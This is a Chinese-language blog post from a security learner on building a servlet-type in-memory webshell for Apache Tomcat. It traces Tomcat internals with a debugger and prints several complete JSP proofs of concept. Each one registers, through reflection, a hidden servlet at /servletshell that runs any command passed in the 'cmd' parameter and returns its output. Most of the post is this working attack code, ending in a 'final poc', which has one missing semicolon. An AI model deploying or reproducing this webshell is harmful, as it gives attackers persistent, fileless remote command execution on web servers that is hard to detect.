---
title: Tomcat内存马—servlet型
date: 2023-06-09 23:11:27
excerpt: Tomcat内存马—servlet型
categories: 学习
---



## 前言

开学鸽了一段时间，现在重新把内存马拿起来

## 正文

servlet型的原理跟前面两种一样，也是想办法动态注册一个servlet。这里先编写一个servlet



打好断点，开始调试，看看在哪进行的实例化



调试发现，实例化是在`DefaultInstanceManager#newInstance` 中进行的，继续向前追踪 `clazz` 的来源



这里也就知道了上文中的 `clazz` 其实就是 `StandardWrapper.servletClass` ，再继续追踪来源的时候，我看到`StandardWrapperValve` 中的 `context` ，也就是 `StandardContext` 有一个 `children` 属性



直接眼前一亮，这里面存储了路由与wrapper的对应关系，那如果我们能将恶意的servlet添加进去是不是就可以实现动态注册servlet了，那么怎么才能将其添加进去呢。看到 `StandardContext` 有一个 `addServlet` 方法



不过并没有具体实现，但是我们在其子类`ApplicationContext` 中找到了实现流程



先判断状态，然后调用 `createWrapper` 方法去封装 `servlet` ，接着调用 `addChild` 方法将其添加到 `children` 中，那么我们是否能通过调用该方法实现servlet的动态注册呢，先试一下，简单写个demo

```php
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.Writer" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    class Servletshell extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd=req.getParameter("cmd");
            if(cmd!=null){
                InputStream in = Runtime.getRuntime().exec("cmd /c "+cmd).getInputStream();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int a = -1;

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }
                Writer writer=resp.getWriter();
                writer.write(new String(baos.toByteArray()));
                writer.flush();
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doPost(req, resp);
        }
    }
%>

<%
    //获取context
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    //修改状态
    Field state=Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
    state.setAccessible(true);
    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);

    //尝试注入
    String servletName="servletShell";
    String servletClass="servletShell.class";
    Class serletC=Servletshell.class;
    Method addServlet=Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredMethod("addServlet", String.class, Class.class);
    //addServlet.setAccessible(true);
    addServlet.invoke(applicationContext,servletName,serletC);
    System.out.println(standardContext.findChildren());
%>
```



可以看到我们自定义的servlet已经插入到 `children` 里了，不过还有一个问题，这没有匹配的路由啊



所以我们还得想办法将路由对应到 `servlet-name`



可以看到有 `addServletMapping` 方法，试试看

```auto
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.Writer" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    class Servletshell extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd=req.getParameter("cmd");
            if(cmd!=null){
                InputStream in = Runtime.getRuntime().exec("cmd /c "+cmd).getInputStream();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int a = -1;

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }
                Writer writer=resp.getWriter();
                writer.write(new String(baos.toByteArray()));
                writer.flush();
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doPost(req, resp);
        }
    }
%>

<%
    //获取context
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    //修改状态
    Field state=Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
    state.setAccessible(true);
    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);

    //尝试注入
    String servletName="servletShell";
    String urlpattern="/servletshell";
    Class serletC=Servletshell.class;

    Method addServlet=Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredMethod("addServlet", String.class, Class.class);
    addServlet.invoke(applicationContext,servletName,serletC);

    Method addServletMapping=Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("addServletMapping", String.class, String.class);
    addServletMapping.invoke(standardContext,urlpattern,servletName);

    System.out.println(standardContext.findChildren());
%>
```



可以看到已经添加进去了，但是访问该路由却是503，并且正常页面也变成503了，猜测是破坏了内存中的结构之类的

不好意思，是我sb了，没把状态修改回来。只需要在后面添加如下代码

```auto
if(state!=null){
        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
    }
```

不过，访问变成了404



现在来分析一下为啥没有正常访问到，在 `ApplicationFilterChain#`\`internalDoFilter `中调用` servlet `的` service\` 方法处打个断点



可以看到这里获取到的是 `DefaultServlet` ，而不是我们注入的 `ServletShell` ，我们现在就来追踪一下这个servlet的来源，该servlet是通过 `setServlet` 方法进行赋值的，在该方法处打个断点



在`ApplicationFilterFactor#createFilterChain`方法中调用该方法进行赋值



继续往前追踪，在`StandardWrapperValv#invoke`可以看到



servlet是 `wrapper.allocate` 的返回值，跟进一下这个方法



简单看一下可知，这里是返回了 `instance` 属性的值，那么此时我们要继续追寻 `instance` 属性的来源，直接看一下 `wrapper` 是咋来的



跟进 `getContainer`



对应的赋值方法为 `setContainer` ，在那打个断点，然后没断下来，说明没有调用到该方法，然后看到上层的`StandardContextValve#invoke`



可以看到wrapper已经被赋值了，该 `wrapper`是从 `request`中获取的，那么我们又要继续追溯 `request` 对象的来源了，看到`org.apache.catalina.connector.CoyoteAdapter#service`



这里获取了 `request` 对象，然后在下面调用了`postParseRequest` 处理



跟进

这里算是一个关键地方，后面就是map方面的操作了



跟踪到这里，也就是`org.apache.catalina.mappe.Mapper#internalMap`的时候，发现了一个关键的属性 `contextVersion`



可以看到 `contextVersion`中的 `exactWrappers` 中存储了我们自定义的其他两个servlet的 `wrapper` ，但是我们动态注入进去的servlet却没有，这貌似也就解释了响应码是404的原因。那么如果我们能将需要注入的servlet的wrapper添加到这里面，就可以成功了呢？说干就干，先找一下有没有方法可以将wrapper插入进去，还真有一个 `addWrapper` 方法



要使用这个方法，我们就需要获取到 `contextVersion` ，还要创建一个自定义的 `wrapper`

先解决第一个问题 — 获取 `contextVersion`

无意之间看到了这么一行代码



然后去看了看 `contextObjectToContextVersionMap`



里面果然存储了 `contextVersion` ，那么我们也就可以通过这个属性获取到 `contextVersion`,那么现在的问题就变成了获取`contextObjectToContextVersionMap` ，只要我们获取到这个mapper对象，也就可以顺理成章的获取到这个属性。所以问题又变成了获取mapper对象，这时我们看到之前说的那个关键操作点



这里先获取到service属性在调用 `getMapper` 获取到 `mapper` 对象，那么我们现在就要想办法去获取到这个 `StandardService` ，后面调试了半天，到处追踪，终于看到了希望



可以看到在 `ApplicationContext` 中有 `service` 这个属性，而 `ApplicationContext` 我们已经能够获取到了，所以问题圆满解决。

```auto
//获取service属性
    Field servicef=applicationContext.getClass().getDeclaredField("service");
    servicef.setAccessible(true);
    StandardService service=(StandardService) servicef.get(applicationContext);

    //获取mapper
    Mapper mapper=service.getMapper();

    //获取contextVersion
    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
    contextObjectToContextVersionMapf.setAccessible(true);
    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);
    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);

    //调用addWrapper方法
    Class[] classes=mapper.getClass().getDeclaredClasses();
    Class classt=classes[1];
    Method addWrapper=mapper.getClass().getDeclaredMethod("addWrapper", classt, String.class, Wrapper.class, boolean.class, boolean.class);
    addWrapper.setAccessible(true);
    addWrapper.invoke(mapper,contextVersion,"/servletshell",shellWrapper,false,false);
    System.out.println("ook");
```

继续看第二个问题 — 创建自定义 `wrapper`

在 `StandardContext`中，存在 `createWrapper` 方法，我们可以通过该方法来创建自定义的 `wrapper`



```auto
//创建自定义wrapper
    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();
    shellWrapper.setServlet(shell);
    shellWrapper.setServletClass(shell.getClass().getName());
```

然后我们组合一下

```auto
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.Writer" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page import="org.apache.catalina.core.StandardService" %>
<%@ page import="org.apache.catalina.mapper.Mapper" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    class Servletshell extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd=req.getParameter("cmd");
            if(cmd!=null){
                InputStream in = Runtime.getRuntime().exec("cmd /c "+cmd).getInputStream();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int a = -1;

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }
                Writer writer=resp.getWriter();
                writer.write(new String(baos.toByteArray()));
                writer.flush();
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doPost(req, resp);
        }
    }
%>

<%
    //获取context
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    //修改状态
    Field state=Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
    state.setAccessible(true);
    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);

    //尝试注入
    String servletName="ServletShell";
    String urlpattern="/servletshell";
    Class serletC=Servletshell.class;

    Method addServlet=Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredMethod("addServlet", String.class, Class.class);
    addServlet.invoke(applicationContext,servletName,serletC);

    Method addServletMapping=Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("addServletMapping", String.class, String.class);
    addServletMapping.invoke(standardContext,urlpattern,servletName);

    Servletshell shell=new Servletshell();
    //创建自定义wrapper
    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();
    shellWrapper.setServlet(shell);
    shellWrapper.setServletClass(shell.getClass().getName());
    //shellWrapper.addMapping("/servletshell");

    //获取service属性
    Field servicef=applicationContext.getClass().getDeclaredField("service");
    servicef.setAccessible(true);
    StandardService service=(StandardService) servicef.get(applicationContext);

    //获取mapper
    Mapper mapper=service.getMapper();

    //获取contextVersion
    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
    contextObjectToContextVersionMapf.setAccessible(true);
    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);
    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);

    //调用addWrapper方法
    Class[] classes=mapper.getClass().getDeclaredClasses();
    Class classt=classes[1];
    Method addWrapper=mapper.getClass().getDeclaredMethod("addWrapper", classt, String.class, Wrapper.class, boolean.class, boolean.class);
    addWrapper.setAccessible(true);
    addWrapper.invoke(mapper,contextVersion,"/servletshell",shellWrapper,false,false);
    System.out.println("ook");

    if(state!=null){
        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
    }
%>
```



但是访问还是报500，看一下是否将wrapper正确添加了

可以看到确实将wrapper添加了进去，但是格式不太对，回去看了一下wrapper的属性，原来是没有设置 `parent` 属性

```auto
shellWrapper.setParent(standardContext);
```

添加这一行即可，修改后的poc

```auto
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.Writer" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page import="org.apache.catalina.core.StandardService" %>
<%@ page import="org.apache.catalina.mapper.Mapper" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    class Servletshell extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd=req.getParameter("cmd");
            if(cmd!=null){
                InputStream in = Runtime.getRuntime().exec("cmd /c "+cmd).getInputStream();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int a = -1;

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }
                Writer writer=resp.getWriter();
                writer.write(new String(baos.toByteArray()));
                writer.flush();
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doPost(req, resp);
        }
    }
%>

<%
    //获取context
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    //修改状态
    Field state=Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
    state.setAccessible(true);
    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);

    //尝试注入
    String servletName="ServletShell";
    String urlpattern="/servletshell";
    Class serletC=Servletshell.class;

    Method addServlet=Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredMethod("addServlet", String.class, Class.class);
    addServlet.invoke(applicationContext,servletName,serletC);

    Method addServletMapping=Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("addServletMapping", String.class, String.class);
    addServletMapping.invoke(standardContext,urlpattern,servletName);

    Servletshell shell=new Servletshell();
    //创建自定义wrapper
    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();
    shellWrapper.setServlet(shell);
    shellWrapper.setServletClass(shell.getClass().getName());
    shellWrapper.setParent(standardContext);
    //shellWrapper.addMapping("/servletshell");

    //获取service属性
    Field servicef=applicationContext.getClass().getDeclaredField("service");
    servicef.setAccessible(true);
    StandardService service=(StandardService) servicef.get(applicationContext);

    //获取mapper
    Mapper mapper=service.getMapper();

    //获取contextVersion
    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
    contextObjectToContextVersionMapf.setAccessible(true);
    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);
    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);

    //调用addWrapper方法
    Class[] classes=mapper.getClass().getDeclaredClasses();
    Class classt=classes[1];
    Method addWrapper=mapper.getClass().getDeclaredMethod("addWrapper", classt, String.class, Wrapper.class, boolean.class, boolean.class);
    addWrapper.setAccessible(true);
    addWrapper.invoke(mapper,contextVersion,"/servletshell",shellWrapper,false,false);
    System.out.println("ook");

    if(state!=null){
        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
    }
%>
```



成功注入

后面测试了一下，前面的 addservlet方法这些不需要执行就能成功，所以最终poc

```auto
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.Writer" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page import="org.apache.catalina.core.StandardService" %>
<%@ page import="org.apache.catalina.mapper.Mapper" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    class Servletshell extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd=req.getParameter("cmd");
            if(cmd!=null){
                InputStream in = Runtime.getRuntime().exec("cmd /c "+cmd).getInputStream();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] b = new byte[1024];
                int a = -1;

                while ((a = in.read(b)) != -1) {
                    baos.write(b, 0, a);
                }
                Writer writer=resp.getWriter();
                writer.write(new String(baos.toByteArray()));
                writer.flush();
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            super.doPost(req, resp);
        }
    }
%>

<%
    //获取context
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

      //创建自定义wrapper
    Servletshell shell=new Servletshell()
    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();
    shellWrapper.setServlet(shell);
    shellWrapper.setServletClass(shell.getClass().getName());
    shellWrapper.setParent(standardContext);

    //获取service属性
    Field servicef=applicationContext.getClass().getDeclaredField("service");
    servicef.setAccessible(true);
    StandardService service=(StandardService) servicef.get(applicationContext);

    //获取mapper
    Mapper mapper=service.getMapper();

    //获取contextVersion
    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
    contextObjectToContextVersionMapf.setAccessible(true);
    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);
    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);

    //调用addWrapper方法
    Class[] classes=mapper.getClass().getDeclaredClasses();
    Class classt=classes[1];
    Method addWrapper=mapper.getClass().getDeclaredMethod("addWrapper", classt, String.class, Wrapper.class, boolean.class, boolean.class);
    addWrapper.setAccessible(true);
    addWrapper.invoke(mapper,contextVersion,"/servletshell",shellWrapper,false,false);
%>
```

简短了很多

## 总结

在实现servlet内存马的过程中，没有像以前一样，完全照着资料做，大部分都是自己来调试，花的时间确实要多了一些，不过感觉这样的影响更深刻，还可以有一些自己的理解，感觉很好。不过因为许多是自己的理解，所以肯定会有错误的地方，希望各位师傅不吝赐教。

